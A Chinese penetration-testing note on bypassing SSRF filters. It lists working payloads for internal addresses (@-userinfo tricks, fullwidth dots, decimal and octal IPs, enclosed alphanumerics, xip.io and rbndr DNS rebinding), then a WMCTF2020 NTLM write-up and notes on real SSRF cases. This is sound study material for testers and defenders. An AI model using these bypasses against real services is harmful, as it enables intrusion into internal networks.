---
title: "SSRF【绕过姿势】"
slug: kizum5
date: 2020-12-29T18:23:11+08:00
source: yuque/penetration
---

本文主要介绍SSRF漏洞受到各种限制时，常见的绕过姿势。



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606801745441-a00a3bdb-b610-457c-9bfd-40e66863a1c3.png)

<font style="color:#8C8C8C;">（图片来自</font> [SSRF漏洞Bypass技巧](https://zhuanlan.zhihu.com/p/73736127)<font style="color:#8C8C8C;">）</font>

## 0x00    URL scheme


![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606786970656-7724da11-d2ac-4e8e-9c6e-df3c473241c0.png)

```plain
第一部分：协议名(以单个冒号结束)
第二部分：用户信息 也就是账号密码！(登陆ftp时常用)
第三部分：主机名(也就是域名)
第四部分：端口
第五部分：查询内容，包含【path+param】，这里有个bug。应该是?号后的内容才是查询！ 
第六部分：Fragment ID(不会发送到服务器！)
```

**1.提取协议名：**

他会查找第一个 `:` 号在哪，如果找到了，那么`:` 号左边的便是协议名！

如果获得的协议名中出现了不该有的字符，那么认为这可能就是个相对的`url `，获得的并不是协议名！

**2.去除层级url标记符：**

字符串 `//` 应该算跟在协议名后面的 如果发现有该字符 则会跳过该字符 如果没有找到便不管了！所以 http:baidu.com 也是可以访问的！ 浏览器中还可以用反斜杠来代替正斜杆 `\\` 代替 `//` firefox除外！



## 0x01    浏览器解析特性
### 1. @
简单来说，正常的web应用处理是这样的：

先使用`parse_url`对用户传入的URL解析，获取到host，将host传入`check_inner_ip`，检查是否是内网IP。

如果检查通过，则将URL传给HTTP库发送请求。

所以绕过的核心原理是，`parse_url`时获取的host是A，实际使用HTTP库（如curl）发包时，他内部获取的host是B，利用这两个差异绕过`check_inner_ip`。

这个差异通常是二者使用的URL解析逻辑不同导致的。比如，PHP使用CURL发送请求，而CURL底层实际上是个第三方库。那么PHP自己的`parse_url`，和CURL库内部的“`parse_url`”，就可能存在差异。

```plain
http://xss1.com&action=test@www.baidu.com

@External_Domain@12.0.0.1
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606787636361-893af878-6823-4797-aee9-34aa2bc33b4f.png)Chrome不可以!



### 2. 句号
```basic
127。0。0。1 >>> 127.0.0.1
```

![](https://cdn.nlark.com/yuque/0/2020/gif/166008/1606801502518-d6354dcb-6dd4-4fcb-ab9f-43fd990f6ee7.gif)

### 3. # ?
```basic
#.jpg
?.jpg
```

截断！详见一次实战代码审计

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606802208291-e92123fa-abaa-4ec1-8b9c-ede946a5661f.png)

****

## 0x02    PunnyCode
> 因为操作系统的核心都是英文组成，[DNS服务器](https://baike.baidu.com/item/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8)的解析也是由英文代码交换，所以DNS服务器上并不支持直接的中文域名解析，所有中文域名的解析都需要转成punycode码，然后由[DNS解析](https://baike.baidu.com/item/DNS%E8%A7%A3%E6%9E%90)punycode码。其实所说和各种浏览器完美支持中文域名，只是浏览器软件里面主动加入了中文域名自动转码，不需要原来的再次安装中文域名转码控件来完成整个流程。
>
> 
>
> 例如：企鹅[.com](https://baike.baidu.com/item/.com)，用Punycode转换后为：xn--hoq754q. com
>
> 中国.cn，用Punycode转换后为：xn--fiqs8s. cn<sup></sup>
>

```plain
ⅅʳºℙˢ  -->  drops 
ʷººʸⓊⁿ       —>  wooyun
Ⓞʳℊ         —>  org

ⅅʳºℙˢ.ʷººʸⓊⁿ.ºʳℊ --> drops.wooyun.org
```



## 0x03    进制转换
`http://664552783`  =>  `http://baidu.com`

```bash
$ ping baidu.com
Pinging baidu.com [39.156.69.79] with 32 bytes of data:
```



### 十进制
39.156.69.79 => 664552783（十进制）

### 八进制
39.156.69.79 => <font style="color:#BFBFBF;">0</font>4747042517 (八进制)

> **Octal**，是一种计数法，采用0，1，2，3，4，5，6，7八个数码，逢八进位，并且开头一定要以数字0开头。
>

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606801176470-ece0052a-e323-4138-8a53-7b23a526cb6a.png)

还有一种，IPV6形式

```plain
[0:0:0:0:0:ffff:127.0.0.1]
::ffff:7f00:1
0:0::1
0:0:0:0:0:0:0:0
```

以及特殊形式`http://0/`

## **0x04    短网址**
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606805795686-d876836d-030a-46df-a013-11e1f48457a0.png)

实际是基于302跳转的

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606805875854-05fab5ca-c3fe-4805-a669-a72860050d44.png)



**个人常用的短网址服务**

```plain
suo.im
tinyurl.com
goo.gl 
...
```





## **0x05    xip.io / xip.name**
**xip.name**

类似于一个"转发"的东西，绕过关键词白名单时很好用，如 `if "baidu" in URL: {visit(URL);}`

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606804475039-351818dd-24d8-408a-9dec-ea832a3da230.png)

****

**xip.io******

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606805558592-61d5c22b-85b7-4c54-9eeb-b1dd2b933834.png)

```plain
127.0.0.1.xip.io 								 	>>>  127.0.0.1
www.baidu.com.127.0.0.1.xip.io		>>>  127.0.0.1
...
```

类似的服务，还有

```basic
lvh.me
*.localtest.me	（see：readme.localtest.me ）

ping 1.2.3.4.sslip.io
ping 1.1.2.3.nip.io 
```

## **0x06    Enclosed alphanumerics**
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606803924802-1df6ca23-db8c-45cf-b2cb-87913fe4af97.png)



> ![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606803841753-9b365011-127a-4d82-aed3-6810746a3c34.png)
>
> + 概念:[https://en.wiktionary.org/wiki/Appendix:Unicode/Enclosed_Alphanumerics](https://en.wiktionary.org/wiki/Appendix:Unicode/Enclosed_Alphanumerics)
> + 使用:[https://www.qqxiuzi.cn/zh/shijiewenzi/?character=Enclosed%20Alphanumerics](https://www.qqxiuzi.cn/zh/shijiewenzi/?character=Enclosed%20Alphanumerics)
>

```basic
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> http://example.com
ⓑⒶⒾⒹⓤ。Cⓞm >>> http://baidu.com
```

![](https://cdn.nlark.com/yuque/0/2020/gif/166008/1606803777842-beba1386-ce89-4358-832c-ea7853b6a771.gif)



```plain
①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿
```

## 0x07    内网地址
通常我们会将以下三个段设置为内网IP段，所有内网内的机器分配到的IP是在这些段中：



> 完整列表参考[https://datatracker.ietf.org/doc/html/rfc5735](https://datatracker.ietf.org/doc/html/rfc5735)
>
> + RFC 5735😂
>
> ![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627287014915-4f1ee21d-122f-47ca-a831-39c4f59dbc35.png)
>

```bash
192.168.0.0/16 	=> 192.168.0.0 ~ 192.168.255.255
10.0.0.0/8 			=> 10.0.0.0 ~ 10.255.255.255
172.16.0.0/12 	=> 172.16.0.0 ~ 172.31.255.255
127.0.0.0/8
```

所以通常，我们只需要判断目标IP不在这三个段，另外还包括 `127.0.0.0/8` 和 `0.0.0.0/8 `

> 1. 本地地址不但可以用常见的`127.0.0.1`表示，还可以用`127.6.6.6`来表示
> 2. 在Linux下，`127.0.0.1` 与`0.0.0.0` 都指向本地，参考 [http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
>

# Some Practices
一些小练习

### 第一弹: 欲盖弥彰
```plain
①②⑦。⓪。⓪。①
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606803282628-c0f1e728-32e2-4cf3-8e7b-b1cb169a9c28.png)

![](https://cdn.nlark.com/yuque/0/2020/gif/166008/1606803250425-51c07e25-5a9b-4235-9dc3-820ea77f8f27.gif)

### 第二弹: 偷天换日
```plain
http://qq.com？action=submit&ID=@04747042517
```

![](https://cdn.nlark.com/yuque/0/2020/gif/166008/1606802423050-3bb39349-5e0b-403a-849b-062fe49c9119.gif)

加个高亮就更清楚

```basic
http://qq.com？action=submit&ID=@04747042517
注意
- ？号，是中文的问号
- @，才是最关键的，后面0开头的字符串，是八进制表示的IP地址，前面的都是userinfo
```



# DNS rebinding 重绑定
## 1. DNS请求过程
1. 查询本地DNS服务器(/etc/resolv.conf)
2. 如果有缓存，返回缓存的结果，不继续往下执行
3. 如果没有缓存，请求远程DNS服务器，并返回结果



平时使用的MAC和Windows电脑上，为了加快HTTP访问速度，系统都会进行DNS缓存。但是，在Linux上，默认不会进行DNS缓存([https://stackoverflow.com/questions/11020027/dns-caching-in-linux](https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/11020027/dns-caching-in-linux)) ，除非运行nscd等软件。

不过，知道Linux默认不进行DNS缓存即可。这也解释了，我为什么同样的配置，我在MAC上配置不成功，Linux上配置可以。

需要注意的是，IP为8.8.8.8的DNS地址，本地不会进行DNS缓存。

1. Java默认不存在被DNS Rebinding绕过风险（TTL默认为10）



2. PHP默认会被DNS Rebinding绕过



3. Linux默认不会进行DNS缓存

> **DNS请求过程**
>
> 1. 查询本地DNS服务器(/etc/resolv.conf)
> 2. 如果有缓存，返回缓存的结果，不继续往下执行
> 3. 如果没有缓存，请求远程DNS服务器，并返回结果
>

## 2. 重绑定实现过程
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606807255024-0c8717ad-5a9a-44e9-a587-f48e0b0131ac.png)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606831393974-9f7a1a12-74b7-4455-858a-b4ae255b1402.png)![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606831432939-70708306-f9f9-4c78-90e0-2bd7c06b7a22.png)

其实，知道创宇的`ceye.io`平台中，也有DNS Rebinding服务

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1609232371555-3b2919f2-d0b4-47b9-b197-0395af6ece7f.png)![](https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1609232399706-fd04d768-c47f-4f37-bf2e-17324baa4a37.jpeg)

实战时，用`r.xxxxx.ceye.io`即可

第一次请求，返回`127.0.0.1`

```bash
$ nslookup r.abcdef.ceye.io
Server:        8.8.8.8
Address:    8.8.8.8#53
Non-authoritative answer:
Name:    r.abcdef.ceye.io
Address: 127.0.0.1
```

第二次请求，返回`192.168.0.1`

```bash
$ nslookup r.abcdef.ceye.io
Server:        8.8.8.8
Address:    8.8.8.8#53
Non-authoritative answer:
Name:    r.abcdef.ceye.io
Address: 192.168.0.1
```

## 3. 一个不容忽视的前提
<font style="color:#282828;">目标使用的</font>**<font style="color:#282828;">DNS服务器，</font>**<font style="color:#282828;">会影响DNS Rebinding攻击的效果。因此如果要成功进行DNS Rebinding攻击，必须目标使用了遵守TTL规则的DNS服务器。</font>

<font style="color:#282828;">常用的public dns：</font>

```bash
- 遵守DNS TTL规则的有：	8.8.8.8
- 未遵守规则的有：1.1.1.1、223.5.5.5、119.29.29.29
- 是否缓存DNS记录比较随性的有：114.114.114.114
```

可见，大部分DNS为了节省请求数量，都会缓存DNS记录，只有8.8.8.8对TTL实现的比较理想。

## 4. 利用工具
可以采用`[https://github.com/taviso/rbndr](https://github.com/taviso/rbndr)`来进行DNS rebinding

```php
# 在255.255.255.255与外网ip之间切换
ffffffff.2FF02E9A.rbndr.us
  
# 在127.0.0.1与外网ip之间切换
7F000001.2FF02E9A.rbndr.us
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622190289433-29afae9e-deea-4465-8727-59b1512d1191.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622190281044-81b6f3d8-28df-4e74-bc4b-1b13712944fa.png)

---

# CTF风格的一些题
## WMCTF2020-SimpleAuth
> [https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md#SimpleAuth](https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md#SimpleAuth)
>

输入url参数后，提示只支持http协议。

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1609232682815-39e5d871-8617-4198-a148-28082f4e8073.png)

构造url请求自己vps的http端口，可以成功收到http请求。

![](https://camo.githubusercontent.com/d1f779a07b96f893225aa6c73a30d0dcb550db7e4d1dd9747419e0ab75e35434/68747470733a2f2f75706c6f616465722e7368696d6f2e696d2f662f6c587a534d385169696e746a365a64622e706e67217468756d626e61696c)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1609232716846-b72a2174-5ad9-4eb0-9d5b-8fd6438840fe.png)

响应正常http时，页面显示nothing，**接着可以【尝试修改http响应包】进行测试**，比如返回401认证。

```http
<?php
    header('WWW-Authenticate: Basic realm="test"'); 
    header('HTTP/1.0 401 Unauthorized'); 
?>
```

![](https://camo.githubusercontent.com/66b018c580414f5f7f1801a9506541f2238c5fb9aa646462b90a793b4849157f/68747470733a2f2f75706c6f616465722e7368696d6f2e696d2f662f3169734b396437516d563073553670422e706e67217468756d626e61696c)

当响应401认页面的内容发现了变化，提示不支持该认证类型。通过【**查阅资料】得知**HTTP支持Basic、Digest、NTLM等认证类型，从网站信息中得知网站为Windows服务器。尝试响应NTLM类型的401认证。

```http
<?php
    header('WWW-Authenticate: NTLM'); 
    header('HTTP/1.0 401 Unauthorized'); 
?>
```

重新请求发现响应内容发现了变化<font style="color:#24292E;">。 </font>

通过tcpdump抓包可以看到，当http响应头要求NTLM认证时，题目会通过http NTLM认证再次请求url。

![](https://camo.githubusercontent.com/3f2603300fd218983b154b855853405443f3e57e466df5b4163a3eed7a0b401c/68747470733a2f2f75706c6f616465722e7368696d6f2e696d2f662f564a747950335579676c7a714b3667692e706e67217468756d626e61696c)



---

# 后记：SSRF实战与理论


## 知乎主站一处SSRF漏洞可探测内网
**来源**

> 【漏洞学习——SSRF】知乎主站一处SSRF漏洞可探测内网 [https://blog.csdn.net/Fly_hps/article/details/84400273](https://blog.csdn.net/Fly_hps/article/details/84400273)
>

**漏洞描述**

知乎回答问题的时候，输入网址将自动被转换为标题。比如输入[http://wooyun.org/](http://wooyun.org/)，将会变成：

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606722728534-70c4519a-1cee-47e6-ac05-3d82390d9d0d.png)

明显是后台进行了请求。

抓包，发现是请求的[http://www.zhihu.com/scraper](http://www.zhihu.com/scraper)：



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1606722720922-5a283882-3381-4052-ac7e-236b0469d9c0.png)



## 低危SSRF提权进内网
**来源**

> R3start 低危SSRF提权进内网
>
> [https://mp.weixin.qq.com/s/HjvviHp1EdAmWEUE4fbajQ](https://mp.weixin.qq.com/s/HjvviHp1EdAmWEUE4fbajQ)
>

**漏洞描述**

通过SSRF点，进入内网，最终在Redis中反复乱杀



## WordPress SSRF(DNS Rebinding)
See:[http://redteam.today/2019/11/01/wordpress%20xmlrpc.php%20have%20ssrf%20vuln(use%20dns%20rebinding%20bypass%20limit)/](http://redteam.today/2019/11/01/wordpress%20xmlrpc.php%20have%20ssrf%20vuln(use%20dns%20rebinding%20bypass%20limit)/)

# 参考资料
+ 利用 Gopher 协议拓展攻击面 [https://blog.chaitin.cn/gopher-attack-surfaces/](https://blog.chaitin.cn/gopher-attack-surfaces/)
+ SSRF漏洞的利用与攻击内网应用实战 [https://xz.aliyun.com/t/7405#toc-0](https://xz.aliyun.com/t/7405#toc-0)
+ URL Hacking - 前端猥琐流[ https://wooyun.js.org/drops/URL%20Hacking%20-%20%E5%89%8D%E7%AB%AF%E7%8C%A5%E7%90%90%E6%B5%81.html](https://wooyun.js.org/drops/URL%20Hacking%20-%20%E5%89%8D%E7%AB%AF%E7%8C%A5%E7%90%90%E6%B5%81.html)

